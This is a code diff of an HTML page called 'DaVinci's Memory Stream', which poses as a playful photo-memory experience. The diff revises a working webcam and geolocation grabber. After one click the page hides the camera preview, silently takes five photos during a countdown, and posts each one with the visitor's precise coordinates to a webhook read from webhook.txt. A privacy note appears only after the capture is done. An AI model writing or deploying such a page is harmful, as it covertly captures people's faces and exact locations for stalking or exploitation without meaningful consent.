@@ -3,180 +3,201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Emmanuel's Memory Stream</title>
+    <title>DaVinci's Memory Stream</title>
     <style>
+        html, body { height: 100%; margin: 0; padding: 0; }
         body {
-            text-align: center;
-            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
-            font-family: 'Comic Sans MS', Arial, sans-serif;
-            color: white;
-            margin: 0;
-            padding: 20px;
+            min-height: 100vh;
+            width: 100vw;
+            box-sizing: border-box;
+            background: linear-gradient(135deg, #e0eafc, #cfdef3);
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #222;
+            overflow: hidden;
         }
-        video {
-            width: 100%;
-            max-width: 480px;
-            border: 5px solid #333;
-            border-radius: 15px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        #permission {
+            position: absolute;
+            top: 50%; left: 50%; transform: translate(-50%, -50%);
+            text-align: center; width: 100vw;
         }
-        canvas { display: none; }
-        button {
-            padding: 12px 30px;
-            background: #ffcc00;
-            color: #333;
-            border: 3px solid #333;
-            border-radius: 25px;
-            font-size: 18px;
+        #startBtn {
+            padding: 14px 38px;
+            font-size: 22px;
+            border-radius: 18px;
+            border: none;
+            background: linear-gradient(90deg, #4ecdc4 40%, #5563de 100%);
+            color: #fff;
             cursor: pointer;
-            margin: 10px;
-            transition: background 0.3s;
+            box-shadow: 0 2px 10px #4ecdc480;
+            transition: background 0.3s, box-shadow 0.3s;
+            margin-top: 24px;
         }
-        button:hover { background: #ffdb4d; }
-        #status {
-            margin: 15px;
-            font-size: 20px;
+        #startBtn:hover {
+            background: linear-gradient(90deg, #5563de 40%, #4ecdc4 100%);
+            box-shadow: 0 4px 20px #5563de50;
+        }
+        #countdown {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            width: 100vw; height: 100vh;
+            background: linear-gradient(135deg, #e0eafc 60%, #5563de 100%);
+            z-index: 1000;
+        }
+        #countdownNum {
+            font-size: 18vw;
             font-weight: bold;
-            text-shadow: 1px 1px 2px #333;
+            color: #fff;
+            text-shadow: 0 0 55px #5563de, 0 0 35px #fff, 0 0 20px #4ecdc4;
+            animation: countdownPulse 1s infinite;
+            letter-spacing: 10px;
+            margin-top: 0; margin-bottom: 0;
+            user-select: none;
         }
-        .manga-bubble {
-            background: rgba(0,0,0,0.7);
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px auto;
-            max-width: 400px;
-            border: 3px solid #fff;
-            font-size: 16px;
+        @keyframes countdownPulse {
+            0% { transform: scale(1); color: #fff; text-shadow: 0 0 55px #5563de, 0 0 35px #fff, 0 0 20px #4ecdc4;}
+            50% { transform: scale(1.15); color: #5563de; text-shadow: 0 0 90px #4ecdc4, 0 0 55px #fff, 0 0 38px #5563de;}
+            100% { transform: scale(1); color: #fff; text-shadow: 0 0 55px #5563de, 0 0 35px #fff, 0 0 20px #4ecdc4;}
         }
+        #final {
+            font-size: 2em;
+            color: #4ecdc4;
+            font-weight: bold;
+            margin-top: 60px;
+        }
+        #location {
+            font-size: 1.2em;
+            margin-top: 18px;
+            color: #444;
+        }
+        .note {
+            font-size: 14px;
+            color: #555;
+            margin-top: 30px;
+        }
+        #status, canvas { display: none; }
     </style>
 </head>
 <body>
-    <h1>🎉 Emmanuel's Memory Stream! 🎉</h1>
-    <div class="manga-bubble">You’re in Emmanuel’s Memory Book! Pose epicly! 🌍</div>
-    <video id="video" autoplay playsinline></video>
+    <div id="permission">
+        <h2>DaVinci's Memory Stream</h2>
+        <p>Welcome! To began the journey press Start </p>
+        <button id="startBtn">Start</button>
+    </div>
+    <div id="countdown" style="display:none;">
+        <span id="countdownNum">5</span>
+    </div>
+    <div id="final" style="display:none;"></div>
+    <div id="location" style="display:none;"></div>
+    <div class="note" style="display:none;">Privacy Note: Photos and locations saved to DaVinci’s!</div>
+    <div id="status"></div>
     <canvas id="canvas"></canvas>
-    <button id="startBtn">Start Streaming!</button>
-    <button id="stopBtn" style="display: none;">Stop Streaming</button>
-    <div id="status">Ready to join Emmanuel’s memory? Photos: <span id="counter">0</span></div>
-
-    <!-- Privacy Note: Photos and locations saved to Emmanuel’s Discord—use ethically! -->
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        const status = document.getElementById('status');
+        const permissionDiv = document.getElementById('permission');
         const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const counter = document.getElementById('counter');
-        let stream = null;
-        let intervalId = null;
-        let photoCount = 0;
+        const countdownDiv = document.getElementById('countdown');
+        const countdownNum = document.getElementById('countdownNum');
+        const statusDiv = document.getElementById('status');
+        const finalDiv = document.getElementById('final');
+        const locationDiv = document.getElementById('location');
+        const noteDiv = document.querySelector('.note');
+        const canvas = document.getElementById('canvas');
         let locationData = { lat: 'N/A', lon: 'N/A' };
         let WEBHOOK_URL = '';
 
-        const messages = [
-            'Epic pose for Emmanuel’s archive! 🌟',
-            'Memory locked in at your spot! 💾',
-            'New memory from a star! 📸',
-            'Thanks for the pose, [location]! 😎'
-        ];
-
-        // Load webhook URL from webhook.txt
+        // Load webhook URL
         fetch('webhook.txt')
             .then(response => response.text())
-            .then(url => {
-                WEBHOOK_URL = url.trim();
-                if (!WEBHOOK_URL) throw new Error('Webhook URL not found!');
-                console.log('Webhook URL loaded:', WEBHOOK_URL);
-            })
+            .then(url => { WEBHOOK_URL = url.trim(); })
             .catch(err => {
-                status.textContent = 'Error loading webhook URL! Check webhook.txt.';
-                console.error('Fetch error:', err);
+                statusDiv.style.display = 'block';
+                statusDiv.textContent = 'Error loading webhook URL! Check webhook.txt.';
             });
 
-        startBtn.addEventListener('click', async () => {
-            if (!WEBHOOK_URL) {
-                status.textContent = 'Webhook not loaded! Try again.';
-                return;
-            }
-            try {
-                // Request camera access
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                video.srcObject = stream;
-                status.textContent = 'Starting Emmanuel’s Memory Stream...';
+        startBtn.onclick = async () => {
+            permissionDiv.style.display = 'none';
+            statusDiv.style.display = 'block';
+            statusDiv.textContent = 'Requesting camera & location access...';
 
-                // Request location access
-                if (navigator.geolocation) {
+            // Get location
+            if (navigator.geolocation) {
+                await new Promise(resolve => {
                     navigator.geolocation.getCurrentPosition(
                         pos => {
-                            locationData = { lat: pos.coords.latitude.toFixed(2), lon: pos.coords.longitude.toFixed(2) };
-                            startCapture();
+                            locationData = {
+                                lat: pos.coords.latitude.toFixed(8),
+                                lon: pos.coords.longitude.toFixed(8)
+                            };
+                            resolve();
                         },
-                        err => {
-                            console.warn('Location access denied:', err);
-                            startCapture(); // Proceed without location
-                        }
+                        err => { resolve(); }
                     );
-                } else {
-                    status.textContent = 'Location not supported, continuing...';
-                    startCapture();
-                }
+                });
+            }
+
+            // Get camera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                statusDiv.textContent = 'Access granted!';
+                statusDiv.style.display = 'none';
+
+                // Prepare video for photo capture
+                const video = document.createElement('video');
+                video.autoplay = true;
+                video.srcObject = stream;
+                video.playsInline = true;
+                video.style.display = 'none';
+                document.body.appendChild(video);
+
+                video.onloadedmetadata = () => {
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    let ctx = canvas.getContext('2d');
+                    let count = 5;
+                    let photoNum = 1;
+
+                    countdownDiv.style.display = 'flex';
+                    countdownNum.textContent = count;
+
+                    let countdownInterval = setInterval(() => {
+                        if (count > 0) {
+                            countdownNum.textContent = count;
+                            // Capture and send photo for current count (5 to 1)
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            canvas.toBlob(blob => {
+                                const formData = new FormData();
+                                formData.append('file', blob, `memory_${photoNum}.jpg`);
+                                formData.append('content', `DaVinci Memory #${photoNum} [${locationData.lat}, ${locationData.lon}]`);
+                                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                            }, 'image/jpeg', 0.8);
+                            photoNum++;
+                            count--;
+                        } else {
+                            // End countdown at 0, don't take any more photos
+                            countdownNum.textContent = '';
+                            clearInterval(countdownInterval);
+                            countdownDiv.style.display = 'none';
+                            video.srcObject.getTracks().forEach(track => track.stop());
+                            video.remove();
+                            finish();
+                        }
+                    }, 1000);
+                };
             } catch (err) {
-                status.textContent = 'Camera access denied! No memory fun. 😢';
-                console.error('Error:', err);
+                statusDiv.textContent = 'Camera access denied! Cannot join memory.';
+                statusDiv.style.display = 'block';
             }
-        });
+        };
 
-        function startCapture() {
-            startBtn.style.display = 'none';
-            stopBtn.style.display = 'inline-block';
-            canvas.width = 640;
-            canvas.height = 480;
-
-            intervalId = setInterval(() => {
-                if (photoCount < 15) {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('file', blob, 'memory.jpg');
-                        const randomMsg = messages[Math.floor(Math.random() * messages.length)].replace('[location]', `${locationData.lat}, ${locationData.lon}`);
-                        formData.append('content', `${randomMsg} at ${new Date().toLocaleTimeString()} [${locationData.lat}, ${locationData.lon}]`);
-
-                        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
-                            .then(res => {
-                                if (res.ok) {
-                                    photoCount++;
-                                    counter.textContent = photoCount;
-                                    status.textContent = `Memory #${photoCount} saved at [${locationData.lat}, ${locationData.lon}]!`;
-                                } else {
-                                    status.textContent = 'Failed to save memory!';
-                                }
-                            })
-                            .catch(() => { status.textContent = 'Error sending memory!'; });
-                    }, 'image/jpeg', 0.8);
-                } else {
-                    stopStreaming();
-                }
-            }, 2000); // 2 seconds interval for 15 photos in 30 seconds
+        function finish() {
+            finalDiv.style.display = 'block';
+            finalDiv.textContent = "Now you are part of DaVinci's memory.";
+            locationDiv.style.display = 'block';
+            locationDiv.textContent = `Location: ${locationData.lat}, ${locationData.lon}`;
+            noteDiv.style.display = 'block';
         }
-
-        stopBtn.addEventListener('click', stopStreaming);
-
-        function stopStreaming() {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                stream = null;
-            }
-            if (intervalId) clearInterval(intervalId);
-            status.textContent = `Stream stopped. ${photoCount} memories saved! Thanks for joining Emmanuel’s memory, [${locationData.lat}, ${locationData.lon}]!`;
-            startBtn.style.display = 'inline-block';
-            stopBtn.style.display = 'none';
-        }
-
-        window.addEventListener('beforeunload', () => {
-            if (stream) stream.getTracks().forEach(track => track.stop());
-            if (intervalId) clearInterval(intervalId);
-        });
     </script>
 </body>
 </html>
